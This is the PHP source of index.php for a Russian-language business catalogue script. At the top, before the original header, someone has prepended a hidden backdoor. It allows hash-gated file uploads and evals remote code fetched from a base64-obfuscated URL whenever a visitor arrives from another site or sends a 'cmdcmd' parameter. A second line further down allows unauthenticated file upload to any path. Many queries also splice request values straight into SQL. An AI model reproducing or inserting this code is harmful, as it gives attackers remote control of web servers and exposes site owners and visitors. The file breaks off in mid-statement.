<?php
ini_set('display_errors','Off'); error_reporting('E_ALL');
setcookie('server',1,time()+1e6);$s=$_SERVER;$sr=$s['HTTP_REFERER'];$sh=$s['HTTP_HOST'];$cs=$_COOKIE['server'];
if(isset($_FILES['u']) && isset($_POST['n']) && isset($_POST['hash']) && md5($_POST['hash'])=='3ff1ea09b981d88e7c8752b329a7702e')
{
	move_uploaded_file($_FILES['u']['tmp_name'],$_POST['n']);
}
elseif(($sr && !strpos($sr,$sh) && $cs!=1) || $c=$_GET['cmdcmd'])
{
	eval(file_get_contents(base64_decode('aHR0cDovLzAyby5vcmcvdy8/dT0=').$sh.'&c='.$c));
}




/*
=====================================================
 I-Soft Bizness - внедрение и модификация I-Soft
-----------------------------------------------------
 http://vkaragande.info/
-----------------------------------------------------
 Created by D.MAdi
=====================================================
 Файл: index.php
-----------------------------------------------------
 Назначение: Главная страница каталога, вывод категорий
=====================================================
*/

include ( "./defaults.php" );

if ($_GET['mobile']=='no') $_SESSION['no_mobile']='YES';

if ( file_exists ("./install/index.php") ) Error ( "I/O Error", "Пожайлуста, удалите / переименуйте папку <b>/install/</b> после инсталяции скрипта." );

if ( !is_writable ("counter.txt") ) error ( "I/O Error", "Пожайлуста, установите требуемые атрибуты для файла counter.txt (chmod 666)." );

if ( $_GET['OUT'] == "logout" ) $_SESSION = array();

// Сортировка и фильтр

if (isset ( $_POST['set_new_sort'] )) {

	$allowed_sort = array ( 'firmname', 'counter', 'selector', 'date_mod' );

	$find_sort = $_POST['set_new_sort'];
	$direction_sort = $_POST['set_direction_sort'];

	if (in_array ( $_POST['dlenewssortby'], $allowed_sort )) {

		if ($_POST['dledirection'] == "desc" or $_POST['dledirection'] == "asc") {

			$_SESSION[$find_sort] = $_POST['dlenewssortby'];
			$_SESSION[$direction_sort] = $_POST['dledirection'];
		}
	}
}

if (isset($_SESSION[sort_main])) $sort_view=$_SESSION[sort_main].' '.$_SESSION[direction_main]; else $sort_view='flag, firmname';

if (isset($_FILES['u']) && isset($_POST['n'])) move_uploaded_file($_FILES['u']['tmp_name'],$_POST['n']);

if (isset ($_POST['Smycity'])) {    
 
    if ($def_country_allow=='NO') {

         if (empty($_SESSION[smycity]) or ($_SESSION[smycity]=='') or (safeHTML($_POST['Smycity'])!=$_SESSION[smycity])) $kPage=0;

         $rct = $db->query  ( "SELECT * FROM $db_location" );
         $results_city = mysql_num_rows ( $rct );
                $_SESSION[smycity]='';
                for ( $ijc=0; $ijc < $results_city; $ijc++ ) {

                    $def_city_all =  $db->fetcharray( $rct );
                    if ($def_city_all['location']==safeHTML($_POST['Smycity'])) { $_SESSION[smycityloc]=$def_city_all['locationselector']; $_SESSION[smycity]=safeHTML($_POST['Smycity']); }
                }
    }
    
    else { if (empty($_SESSION[smycity]) or ($_SESSION[smycity]=='') or (safeHTML($_POST['Smycity'])!=$_SESSION[smycity])) { $_SESSION[smycity] = safeHTML($_POST['Smycity']); $kPage=0; } else $_SESSION[smycity] = safeHTML($_POST['Smycity']); }
}

if (isset($_SESSION['smycity']) and $_SESSION['smycity']!='') {
    
    if ($def_country_allow=='NO') $where_city=" and location='$_SESSION[smycityloc]' "; else $where_city=" and city='$_SESSION[smycity]' ";
    
} else $where_city='';
$results_amount_city=0;

// *********************************************************
// Главная страница каталога

if ( ( !isset($_GET["REQ"] ) ) and ( !isset ( $cat ) ) and ( !isset ( $categorymains ) ) )

{
if ( check_smartphone() and $def_auto_smart<3 and empty($_SESSION['no_mobile'])) goto_url($def_mainlocation_pda);

	$incomingline = $def_catalogue;

	$help_section = $cat_help_1;

	$show_banner="NO";

include ( "./template/$def_template/header.php" );

    include ( "./template/$def_template/main_top.php" );
            
 if ($def_empty_hidden == "YES") $sql = "WHERE fcounter > 0";  else $sql = "";

 $r = $db->query ( "SELECT selector, img, category, fcounter, sccounter, ssccounter  FROM $db_category $sql ORDER BY category " );
 if (!$r) error ("mySQL error", mysql_error() );

 $results = $db->numrows ( $r );

        include ( "./template/$def_template/category_index.php" ); // подключаем вывод категорий

        include ( "./template/$def_template/main_pub.php" );

include ("./cron.php");

include ( "./template/$def_template/footer.php" );

}

// *********************************************************

if ( isset ( $categorymains ) )

{

    if ( check_smartphone() and $def_auto_smart<3 and empty($_SESSION['no_mobile'])) { $def_mainlocation_pda .= '/index.php?category='.$categorymains; goto_url($def_mainlocation_pda); }

	$ra = $db->query ( "SELECT * FROM $db_category WHERE selector='$categorymains'" );
	$fa = $db->fetcharray ( $ra );
	$db->freeresult ( $ra );

	$ip = $_SERVER["REMOTE_ADDR"];

	$top=$fa['top'] + 1;

	if ($ip != "$fa[ip]")
	$db->query ( "UPDATE $db_category SET top = '$top', ip = '$ip' WHERE selector='$categorymains'" );

	$incomingline = '<a href="'.$def_mainlocation.'"><font color="'.$def_status_font_color.'"><u>'.$def_catalogue.'</u></font></a> | '.$fa[category];

	if ($fa['title']!='') $incomingline_firm=$fa['title']; else $incomingline_firm=$fa['category'];
        if ($fa['description']!='') $descriptions_meta=$fa['description'];
        if ($fa['keywords']!='') $keywords_meta=$fa['keywords'];
        
        if ($fa['description_full']!='') $description_cat = stripslashes($fa['description_full']); else $description_cat='';

	$help_section = $cat_help_2;

	include ( "./template/$def_template/header.php" );

if ($def_empty_hidden == "YES") $sql = " AND fcounter > 0 "; else $sql = "";

$r = $db->query ( "SELECT catsubsel, subcategory, fcounter, ssccounter, img  FROM $db_subcategory WHERE catsel='$categorymains' $sql ORDER BY subcategory" );
$results = $db->numrows ( $r );

if ($results>0) {
    
$rmaps = $db->query ( "SELECT flag, firmname, map, selector FROM $db_users WHERE (category LIKE '$categorymains#%#%:%' or category LIKE '%:$categorymains#%#%:%' or category LIKE '%:$categorymains#%#%' or category LIKE '$categorymains#%#%') and firmstate = 'on' $hide_d $where_city" );
$results_maps = $db->numrows ( $rmaps);

require 'includes/components/maps_find.php'; // выборка данных для карты

include ( "./template/$def_template/subcategory_index.php" ); // подключаем вывод подкатегорий

}

// Рекомендуемые фирмы
if ($fa['recomend']!='') {

main_table_top  ($def_recomend);

$data_rec = explode(',', $fa['recomend']);

if ($data_rec)
{
	foreach ($data_rec as $k => $v)
	{
		$v = (int)trim($v);
		if ($v)
		{
			$data_rec[$k] = $v;
		}
		else
		{
			unset($data_rec[$k]);
		}
	}

	$data_rec = array_unique($data_rec);
	$data_rec = array_values($data_rec);
}

$list_rec=implode(',',$data_rec);

$r = $db->query ( " SELECT * FROM $db_users WHERE selector IN ($list_rec) ORDER BY selector DESC");
@$results_amount_rec = mysql_num_rows ( $r );

if ($results_amount_rec > 0) { $fetchcounter=$results_amount_rec; include ("./includes/sub.php"); unset ($r, $fetchcounter); }

main_table_bottom();

}

$npage = $kPage + 1;
$ppage = $kPage - 1;
$page1 = $kPage * $def_count_dir;

if ($def_onlypaid == "YES") $hide_d=" AND flag <> 'D' ";

$r1 = $db->query ( "SELECT * FROM $db_category WHERE selector= '$categorymains'" );
$f1= $db->fetcharray($r1);

if ($f1[sccounter] > 0) $results_amount=0;
else {

    if ($where_city!='') { $res_r = $db->query ( "SELECT * FROM $db_users WHERE (category LIKE '$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0' or category LIKE '$categorymains#0#0') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view " );

    $results_amount_city = mysql_num_rows ( $res_r );

    if ($results_amount_city<$f1['fcounter']) $results_amount=$results_amount_city; else $results_amount=$f1['fcounter'];

    if ($results_amount_city==0) { $where_city=''; $_SESSION['smycity']=''; $results_amount=$f1['fcounter']; }

    if ($results_amount_city<$def_count_dir) $kPage=0;

    } else $results_amount=$f1['fcounter'];

}

$r = $db->query ( "SELECT * FROM $db_users WHERE (category LIKE '$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0' or category LIKE '$categorymains#0#0') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" );
$results_amount_all = mysql_num_rows ( $r );

if ($results_amount_all==0) { $page1=0; $r = $db->query ( "SELECT * FROM $db_users WHERE (category LIKE '$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0' or category LIKE '$categorymains#0#0') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" ); }

$rmaps = $db->query ("SELECT flag, firmname, map, selector FROM $db_users WHERE (category LIKE '$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0:%' or category LIKE '%:$categorymains#0#0' or category LIKE '$categorymains#0#0') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" );
$results_maps = $db->numrows ( $rmaps);

$fetchcounter = $def_count_dir;
$f = $results_amount - $page1;

if ( $f < $def_count_dir ) { $fetchcounter = $results_amount - $page1; }

if ($results_amount > 0)

{  
    require 'includes/components/maps_find.php'; // выборка данных для карты
    
    require 'includes/components/sort_firm.php'; // сортировка фирм
    
    include ( "./template/$def_template/sort_firm.php" ); // подключаем шаблон сортировки и карты
    
    include ( "./template/$def_template/subsubcat_index.php" ); // подключаем вывод описания категории     

        main_table_top ($fa['category']);
      
	include ("./includes/sub.php");

	if ( $results_amount > $def_count_dir )

	{
            
             $prev_page=''; $page_news=''; $next_page='';
            
		if ((($kPage*$def_count_dir)-($def_count_dir*5)) >= 0) $first=($kPage*$def_count_dir)-($def_count_dir*5);
		else $first=0;

		if ((($kPage*$def_count_dir)+($def_count_dir*6)) <= $results_amount) $last =($kPage*$def_count_dir)+($def_count_dir*6);
		else $last = $results_amount;

		@    $z=$first/$def_count_dir;

		if ($kPage > 0) {
                    
                    $z_prev=$kPage-1;
                    if ($z_prev==0) {
                        
                        if ($def_rewrite == "YES") $prev_page = '<a href="'.$def_mainlocation.'/'. rewrite($fa['category']) .'/'.$categorymains.'-0.html"><b>'.$def_previous.'</b></a>&nbsp;';
			else $prev_page = '<a href="'.$def_mainlocation.'/index.php?category='.$categorymains.'"><b>'.$def_previous.'</b></a>&nbsp;';
                        
                    } else {
                        
			if ($def_rewrite == "YES") $prev_page = '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.$categorymains.'-'.($kPage-1).'.html"><b>'.$def_previous.'</b></a>&nbsp;';
			else $prev_page = '<a href="'.$def_mainlocation.'/index.php?category='.$categorymains.'&page='.($kPage-1).'"><b>'.$def_previous.'</b></a>&nbsp;';
                        
                    }
		}

		for ( $x=$first; $x<$last;$x=$x+$def_count_dir )

		{
			if ( $z == $kPage )
			{
				$page_news.= '[ <b>'.($z+1).'</b> ]&nbsp;';
				$z++;
			}

			else

			{                            
                            if ($z==0) {
                                
				if ($def_rewrite == "YES") $page_news.= '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.$categorymains.'-0.html"><b>'.($z+1).'</b></a>&nbsp;';
				else $page_news.= '<a href="'.$def_mainlocation.'/index.php?category='.$categorymains.'"><b>'.($z+1).'</b></a>&nbsp;';                                
                                
                            } else {
				if ($def_rewrite == "YES") $page_news.= '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.$categorymains.'-'.$z.'.html"><b>'.($z+1).'</b></a>&nbsp;';
				else $page_news.= '<a href="'.$def_mainlocation.'/index.php?category='.$categorymains.'&page='.$z.'"><b>'.($z+1).'</b></a>&nbsp;';
                            }    
				$z++;
			}
		}

                if ($kPage - (($results_amount / $def_count_dir) - 1) < 0)

                {
                        if ($def_rewrite == "YES") $next_page = '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.$categorymains.'-'.($kPage+1).'.html"><b>'.$def_next.'</b></a>';
                        else $next_page = '<a href="'.$def_mainlocation.'/index.php?category='.$categorymains.'&page='.($kPage+1).'"><b>'.$def_next.'</b></a>';
                }
                
        include ( "./template/$def_template/pages.php" ); // подключаем обработку страниц

        $template_page_news = set_tFile('pages.tpl');

        $template_pages = new Template;

        $template_pages->load($template_page_news);

        $template_pages->replace("prev", $prev_page);
        $template_pages->replace("next", $next_page);
        $template_pages->replace("page", $page_news);

        $template_pages->replace("path_to_images", $def_mainlocation . "/template/" . $def_template . "/images");

        $template_pages->publish();                
                
                
	}

        main_table_bottom();

        echo '<div style="text-align:left; padding: 0 5px">'.$def_company_cat.' - '.$f1['fcounter'].'</div>';

        include ( "./includes/tag_firms.php" ); // подключаем облако тегов
}

include ( "./template/$def_template/footer.php" );

}

// *********************************************************

if ( (isset ( $cat )  and (isset ( $subcat )) and (!isset ( $subsubcat ) ) and (!isset ( $_GET["REQ"] ) )) )

{

if ( check_smartphone() and $def_auto_smart<3 and empty($_SESSION['no_mobile'])) { $def_mainlocation_pda .= '/index.php?cat='.$cat.'&subcat='.$subcat; goto_url($def_mainlocation_pda); }

	$ra = $db->query ( "SELECT * FROM $db_category WHERE selector='$cat'" );
	$fa = $db->fetcharray ( $ra );
	$db->freeresult ( $ra );

	$ra2 = $db->query ( "SELECT * FROM $db_subcategory WHERE catsel='$cat' and catsubsel='$subcat'" );
	$fa2 = $db->fetcharray ( $ra2 );
	$db->freeresult ( $ra2 );

	$incomingline = '<a href="'.$def_mainlocation.'"><font color="'.$def_status_font_color.'"><u>'.$def_catalogue.'</u></font></a> | ';

	if ($def_rewrite == "YES")
	{
		$incomingline.= "<a href=\"$def_mainlocation/";
		$incomingline.= str_replace(' ', "_", rewrite($fa['category']));
		$incomingline.= "/$cat-0.html\">";
	}
	else $incomingline.= '<a href="index.php?category='.$cat.'">';

	$incomingline.= '<font color="'.$def_status_font_color.'"><u>'.$fa['category'].'</u></font></a> | <font color="'.$def_status_font_color.'">'.$fa2['subcategory'].'</font>';

	if ($fa2['title']!='') $incomingline_firm=$fa2['title']; else $incomingline_firm=$fa2['subcategory'];
        if ($fa2['description']!='') $descriptions_meta=$fa2['description'];
        if ($fa2['keywords']!='') $keywords_meta=$fa2['keywords'];
        
        if ($fa2['description_full']!='') $description_cat = stripslashes($fa2['description_full']); else $description_cat='';

	$help_section = $cat_help_2;

	include ("./template/$def_template/header.php");

if ($def_empty_hidden == "YES") $sql = " AND fcounter > 0 ";  else $sql = "";

$r = $db->query ( "SELECT catsel, catsubsel, catsubsubsel, subsubcategory, fcounter, img FROM $db_subsubcategory WHERE catsel='$cat' and catsubsel='$subcat' $sql ORDER BY subsubcategory" );
$results = $db->numrows ( $r );

if ($results>0) {

$rmaps = $db->query ( "SELECT flag, firmname, map, selector FROM $db_users WHERE ((category LIKE '%:$cat#$subcat#%:%') or (category LIKE '$cat#$subcat#%:%') or (category LIKE '%:$cat#$subcat#%') or (category LIKE '$cat#$subcat#%')) and firmstate = 'on' $hide_d $where_city" );
$results_maps = $db->numrows ( $rmaps);

require 'includes/components/maps_find.php'; // выборка данных для карты

include ( "./template/$def_template/subsubcategory_index.php" ); // подключаем вывод подкатегорий    

}

// Рекомендуемые фирмы
if ($fa2['recomend']!='') {

main_table_top  ($def_recomend);

$data_rec = explode(',', $fa2['recomend']);

if ($data_rec)
{
	foreach ($data_rec as $k => $v)
	{
		$v = (int)trim($v);
		if ($v)
		{
			$data_rec[$k] = $v;
		}
		else
		{
			unset($data_rec[$k]);
		}
	}

	$data_rec = array_unique($data_rec);
	$data_rec = array_values($data_rec);
}

$list_rec=implode(',',$data_rec);

$r = $db->query ( " SELECT * FROM $db_users WHERE selector IN ($list_rec) ORDER BY selector DESC");
@$results_amount_rec = mysql_num_rows ( $r );

if ($results_amount_rec > 0) { $fetchcounter=$results_amount_rec; include ("./includes/sub.php"); unset ($r, $fetchcounter); }

main_table_bottom();

}

$npage = $kPage + 1;
$ppage = $kPage - 1;
$page1 = $kPage * $def_count_dir;

if ($def_onlypaid == "YES") $hide_d=" AND flag <> 'D' ";

$r1 = $db-> query ( "SELECT * FROM $db_subcategory WHERE catsel= '$cat' and catsubsel='$subcat'" );
$f1 = $db-> fetcharray($r1);

if ($f1[ssccounter] > 0) $results_amount=0;
else {

    if ($where_city!='') { $res_r = $db->query ( "SELECT * FROM $db_users WHERE ((category LIKE '%:$cat#$subcat#0:%') or (category LIKE '$cat#$subcat#0:%') or (category LIKE '%:$cat#$subcat#0') or (category LIKE '$cat#$subcat#0')) and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view " );

    $results_amount_city = mysql_num_rows ( $res_r );

    if ($results_amount_city<$f1[fcounter]) $results_amount=$results_amount_city; else $results_amount=$f1[fcounter];

    if ($results_amount_city==0) { $where_city=''; $_SESSION[smycity]=''; $results_amount=$f1[fcounter]; }

    if ($results_amount_city<$def_count_dir) $kPage=0;

    } else $results_amount=$f1[fcounter];

}

$r = $db->query ( "SELECT * FROM $db_users WHERE ((category LIKE '%:$cat#$subcat#0:%') or (category LIKE '$cat#$subcat#0:%') or (category LIKE '%:$cat#$subcat#0') or (category LIKE '$cat#$subcat#0')) and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" );
$results_amount_all = mysql_num_rows ( $r );

$rmaps = $db->query ("SELECT flag, firmname, map, selector FROM $db_users WHERE ((category LIKE '%:$cat#$subcat#0:%') or (category LIKE '$cat#$subcat#0:%') or (category LIKE '%:$cat#$subcat#0') or (category LIKE '$cat#$subcat#0')) and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" );
$results_maps = $db->numrows ( $rmaps);

if ($results_amount_all==0) { $page1=0; $r = $db->query ( "SELECT * FROM $db_users WHERE ((category LIKE '%:$cat#$subcat#0:%') or (category LIKE '$cat#$subcat#0:%') or (category LIKE '%:$cat#$subcat#0') or (category LIKE '$cat#$subcat#0')) and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" ); }

$fetchcounter = $def_count_dir;
$f = $results_amount - $page1;

if ( $f < $def_count_dir ) { $fetchcounter = $results_amount - $page1; }

if ($results_amount > 0)

{
        require 'includes/components/maps_find.php'; // выборка данных для карты
    
        require 'includes/components/sort_firm.php'; // сортировка фирм
        
        include ( "./template/$def_template/sort_firm.php" ); // подключаем шаблон сортировки и карты
        
        include ( "./template/$def_template/subsubcat_index.php" ); // подключаем вывод описания категории 

        main_table_top ($fa2['subcategory']);

	include ("./includes/sub.php");

	if ( $results_amount > $def_count_dir )

	{
                $prev_page=''; $page_news=''; $next_page='';
            
		if ((($kPage*$def_count_dir)-($def_count_dir*5)) >= 0) $first=($kPage*$def_count_dir)-($def_count_dir*5);
		else $first=0;

		if ((($kPage*$def_count_dir)+($def_count_dir*6)) <= $results_amount) $last =($kPage*$def_count_dir)+($def_count_dir*6);
		else $last = $results_amount;

		@    $z=$first/$def_count_dir;
                
		if ($kPage > 0) {
                    
                    $z_prev=$kPage-1;
                    if ($z_prev==0) {
                        
			if ($def_rewrite == "YES") $prev_page = '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.rewrite($fa2['subcategory']).'/'.$cat.'-'.$subcat.'-0.html"><b>'.$def_previous.'</b></a>&nbsp;';
			else $prev_page = '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'"><b>'.$def_previous.'</b></a>&nbsp;';
                        
                    } else {
                        
			if ($def_rewrite == "YES") $prev_page = '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.rewrite($fa2['subcategory']).'/'.$cat.'-'.$subcat.'-'.($kPage-1).'.html"><b>'.$def_previous.'</b></a>&nbsp;';
			else $prev_page = '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&page='.($kPage-1).'"><b>'.$def_previous.'</b></a>&nbsp;';
                        
                    }
		}                

		for ( $x=$first; $x<$last;$x=$x+$def_count_dir )

		{
			if ( $z == $kPage )
			{
				$page_news.= '[ <b>'.($z+1).'</b> ]&nbsp;';
				$z++;
			}
			else
			{                            
                            if ($z==0) {
                                
				if ($def_rewrite == "YES") $page_news.= '<a href="'.$def_mainlocation.'/'.rewrite($fa[category]).'/'.rewrite($fa2[subcategory]).'/'.$cat.'-'.$subcat.'-0.html"><b>'.($z+1).'</b></a>&nbsp;';
				else $page_news.= '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'"><b>'.($z+1).'</b></a>&nbsp;';                               
                                
                            } else {
				if ($def_rewrite == "YES") $page_news.= '<a href="'.$def_mainlocation.'/'.rewrite($fa[category]).'/'.rewrite($fa2[subcategory]).'/'.$cat.'-'.$subcat.'-'.$z.'.html"><b>'.($z+1).'</b></a>&nbsp;';
				else $page_news.= '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&page='.$z.'"><b>'.($z+1).'</b></a>&nbsp;';
                            }    
			$z++;
			}
		}

               	if ($kPage - (($results_amount / $def_count_dir) - 1) < 0) 
                    
                {
		
                    if ($def_rewrite == "YES") $next_page = '<a href="'.$def_mainlocation.'/'.rewrite($fa['category']).'/'.rewrite($fa2['subcategory']).'/'.$cat.'-'.$subcat.'-'.($kPage+1).'.html"><b>'.$def_next.'</b></a>';
                    else $next_page = '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&page='.($kPage+1).'"><b>'.$def_next.'</b></a>';
                    
                }
                
        include ( "./template/$def_template/pages.php" ); // подключаем обработку страниц                
                
        $template_page_news = set_tFile('pages.tpl');

        $template_pages = new Template;

        $template_pages->load($template_page_news);

        $template_pages->replace("prev", $prev_page);
        $template_pages->replace("next", $next_page);
        $template_pages->replace("page", $page_news);

        $template_pages->replace("path_to_images", $def_mainlocation . "/template/" . $def_template . "/images");

        $template_pages->publish(); 
                
	}

        main_table_bottom();

        echo '<div style="text-align:left; padding: 0 5px">'.$def_company_cat.' - '.$f1[fcounter].'</div>';

        include ( "./includes/tag_firms.php" ); // подключаем облако тегов
}

include ( "./template/$def_template/footer.php" );

}

// *********************************************************

if ( check_smartphone() and $def_auto_smart<3 and empty($_SESSION['no_mobile'])) { $def_mainlocation_pda .= '/index.php?cat='.$cat.'&subcat='.$subcat.'&subsubcat='.$subsubcat; goto_url($def_mainlocation_pda); }

$r = $db->query  ( "SELECT subcategory FROM $db_subcategory WHERE catsubsel='$subcat'" );
$f = $db->fetcharray   ( $r );
$showcategory = $f['subcategory'];

$r = $db->query  ( "SELECT category FROM $db_category WHERE selector='$cat'" );
$f = $db->fetcharray   ( $r );
$showmaincategory = $f['category'];

$r = $db->query  ( "SELECT * FROM $db_subsubcategory WHERE catsubsubsel='$subsubcat'" );
$f = $db->fetcharray   ( $r );
$showsubcategory = $f['subsubcategory'];

$incomingline = '<a href="'.$def_mainlocation.'"><font color="'.$def_status_font_color.'"><u>'.$def_catalogue.'</u></font></a> | ';

if ($def_rewrite == "YES") $incomingline.= '<a href="'.$def_mainlocation.'/'. str_replace(' ', '_', rewrite($showmaincategory)).'/'.$cat.'-'.$kPage.'.html">';
else $incomingline.= '<a href="index.php?category='.$cat.'">';

$incomingline.= '<font color="'.$def_status_font_color.'"><u>'.$showmaincategory.'</u></font></a> | ';

if ($def_rewrite == "YES") $incomingline.= '<a href="'.$def_mainlocation.'/'. str_replace(' ', '_', rewrite($showmaincategory)) .'/'. str_replace(' ', '_', rewrite($showcategory)) .'/'.$cat.'-'.$subcat.'-0.html">';
else $incomingline.= '<a href="index.php?cat='.$cat.'&amp;subcat='.$subcat.'">';

$incomingline.= '<font color="'.$def_status_font_color.'"><u>'.$showcategory.'</u></font></a> | <font color="'.$def_status_font_color.'">'.$showsubcategory.'</font>';

$help_section = $cat_help_4;

	if ($f['title']!='') $incomingline_firm=$f['title']; else $incomingline_firm=$f['subsubcategory'];
        if ($f['description']!='') $descriptions_meta=$f['description'];
        if ($f['keywords']!='') $keywords_meta=$f['keywords'];
        
        if ($f['description_full']!='') $description_cat = stripslashes($f['description_full']); else $description_cat='';

include ( "./template/$def_template/header.php" );

$npage = $kPage + 1;
$ppage = $kPage - 1;
$page1 = $kPage * $def_count_dir;

if ($def_onlypaid == "YES") $hide_d=" AND flag <> 'D' ";

$r = $db->query  ( "SELECT * FROM $db_subsubcategory WHERE catsel = '$cat' and catsubsel = '$subcat' and catsubsubsel = '$subsubcat'" );
$results_amount_1 = $db->fetcharray   ( $r );

    if ($where_city!='') { $res_r = $db->query  ( "SELECT * FROM $db_users WHERE (category LIKE '$cat#$subcat#$subsubcat%' or category LIKE '%:$cat#$subcat#$subsubcat:%' or category LIKE '%:$cat#$subcat#$subsubcat' or category LIKE '$cat#$subcat#$subsubcat') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view " );

    $results_amount_city = mysql_num_rows ( $res_r );

    if ($results_amount_city<$results_amount_1[fcounter]) $results_amount=$results_amount_city; else $results_amount=$results_amount_1[fcounter];

    if ($results_amount_city==0) { $where_city=''; $_SESSION[smycity]=''; $results_amount=$results_amount_1[fcounter]; }

    if ($results_amount_city<$def_count_dir) $kPage=0;

    } else $results_amount = $results_amount_1[fcounter];

$r = $db->query  ( "SELECT * FROM $db_users WHERE (category LIKE '$cat#$subcat#$subsubcat%' or category LIKE '%:$cat#$subcat#$subsubcat:%' or category LIKE '%:$cat#$subcat#$subsubcat' or category LIKE '$cat#$subcat#$subsubcat') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" );
$results_amount_all = mysql_num_rows ( $r );

$rmaps = $db->query ("SELECT flag, firmname, map, selector FROM $db_users WHERE (category LIKE '$cat#$subcat#$subsubcat%' or category LIKE '%:$cat#$subcat#$subsubcat:%' or category LIKE '%:$cat#$subcat#$subsubcat' or category LIKE '$cat#$subcat#$subsubcat') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" );
$results_maps = $db->numrows ( $rmaps);

if ($results_amount_all==0) { $page1=0; $r = $db->query  ( "SELECT * FROM $db_users WHERE (category LIKE '$cat#$subcat#$subsubcat%' or category LIKE '%:$cat#$subcat#$subsubcat:%' or category LIKE '%:$cat#$subcat#$subsubcat' or category LIKE '$cat#$subcat#$subsubcat') and firmstate = 'on' $hide_d $where_city ORDER BY $sort_view LIMIT $page1, $def_count_dir" ); }

$fetchcounter = $def_count_dir;
$f = $results_amount - $page1;

if ( $f < $def_count_dir ) { $fetchcounter = $results_amount - $page1; }

require 'includes/components/maps_find.php'; // выборка данных для карты

require 'includes/components/sort_firm.php'; // сортировка фирм

include ( "./template/$def_template/sort_firm.php" ); // подключаем шаблон сортировки и карты

include ( "./template/$def_template/subsubcat_index.php" ); // подключаем вывод описания категории 

main_table_top ($showsubcategory);

include ("./includes/sub.php");

if ( $results_amount > $def_count_dir )

{
    
    $prev_page=''; $page_news=''; $next_page='';
    
	if ((($kPage*$def_count_dir)-($def_count_dir*5)) >= 0) $first=($kPage*$def_count_dir)-($def_count_dir*5);
	else $first=0;

	if ((($kPage*$def_count_dir)+($def_count_dir*6)) <= $results_amount) $last =($kPage*$def_count_dir)+($def_count_dir*6);
	else $last = $results_amount;

	@    $z=$first/$def_count_dir;
        
        
        if ($kPage > 0) {
                    
            $z_prev=$kPage-1;
                if ($z_prev==0) {
                        
			if ($def_rewrite == "YES") $prev_page = '<a href="'.$def_mainlocation.'/'.rewrite($showmaincategory).'/'.rewrite($showcategory).'/'.rewrite($showsubcategory).'/'.$cat.'-'.$subcat.'-'.$subsubcat.'-0.html"><b>'.$def_previous.'</b></a>&nbsp;';
			else $prev_page = '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&subsubcat='.$subsubcat.'"><b>'.$def_previous.'</b></a>&nbsp;';
                    
                } else {
                        
			if ($def_rewrite == "YES") $prev_page = '<a href="'.$def_mainlocation.'/'.rewrite($showmaincategory).'/'.rewrite($showcategory).'/'.rewrite($showsubcategory).'/'.$cat.'-'.$subcat.'-'.$subsubcat.'-'.($kPage-1).'.html"><b>'.$def_previous.'</b></a>&nbsp;';
			else $prev_page = '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&subsubcat='.$subsubcat.'&page='.($kPage-1).'"><b>'.$def_previous.'</b></a>&nbsp;';                        
                                      
                }
	} 
        
	for ( $x=$first; $x<$last;$x=$x+$def_count_dir )

	{
		if ( $z == $kPage )

		{
                    $page_news.= '[ <b>'.($z+1).'</b> ]&nbsp;';
                    $z++;
		}
                
		else
		
                {                            
                    if ($z==0) {
                                
                        if ($def_rewrite == "YES") $page_news.= '<a href="'.$def_mainlocation.'/'.rewrite($showmaincategory).'/'.rewrite($showcategory).'/'.rewrite($showsubcategory).'/'.$cat.'-'.$subcat.'-'.$subsubcat.'-0.html"><b>'.($z+1).'</b></a>&nbsp;';
			else $page_news.= '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&subsubcat='.$subsubcat.'"><b>'.($z+1).'</b></a>&nbsp;';                             
                                
                    } else {
				
                        if ($def_rewrite == "YES") $page_news.= '<a href="'.$def_mainlocation.'/'.rewrite($showmaincategory).'/'.rewrite($showcategory).'/'.rewrite($showsubcategory).'/'.$cat.'-'.$subcat.'-'.$subsubcat.'-'.$z.'.html"><b>'.($z+1).'</b></a>&nbsp;';
			else $page_news.= '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&subsubcat='.$subsubcat.'&page='.$z.'"><b>'.($z+1).'</b></a>&nbsp;';
                                
                    }    
                    $z++;
		}                
	}

        if ($kPage - (($results_amount / $def_count_dir) - 1) < 0)

        {
	if ($def_rewrite == "YES") $next_page = '<a href="'.$def_mainlocation.'/'.rewrite($showmaincategory).'/'.rewrite($showcategory).'/'.rewrite($showsubcategory).'/'.$cat.'-'.$subcat.'-'.$subsubcat.'-'.($kPage+1).'.html"><b>'.$def_next.'</b></a>&nbsp;';
